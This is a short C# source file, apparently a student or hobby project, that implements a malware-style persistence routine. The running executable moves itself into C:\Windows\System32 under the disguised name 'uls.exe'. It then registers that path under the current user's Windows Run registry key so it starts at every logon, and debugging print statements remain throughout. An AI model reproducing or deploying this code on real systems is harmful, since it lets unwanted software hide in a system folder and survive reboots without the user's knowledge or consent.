using System;
using System.Reflection.Metadata;
using System.Runtime;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Xml;
using System.IO;
using System.Runtime.InteropServices.JavaScript;
using Microsoft.Win32;
using System.Windows;
using System.Windows.Forms;

namespace gigas{
    public class RegEdit
    {

        public static void Write()
        {
            
            
            // checks if file already exists
            bool same = false;
            string path = "C:\\Windows\\System32\\uls.exe";
            string currentname = Environment.ProcessPath;
            
            Console.WriteLine(currentname);
            Console.WriteLine(path);
            Console.WriteLine(File.Exists(path));
            if (!File.Exists(path))
            {
                
                // moves file to set location
                File.Move(currentname, path);
            }

            
            // creates new registry key
            RegistryKey szRunKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            
            Console.WriteLine(szRunKey);
            
            // writes new key
            if (szRunKey != null)
            {
                
        
                if(!same)   
                {
                
                    Console.WriteLine("writing new key");
                    szRunKey.CreateSubKey("CSC432",RegistryKeyPermissionCheck.ReadWriteSubTree);
                    szRunKey.SetValue("StringValue",path);
                    
                    

                }
                szRunKey.Close();    
            
            } 
            
            else{Console.WriteLine("Registry Key Not Found.");}
          
            
            
           
        }
    }
    
}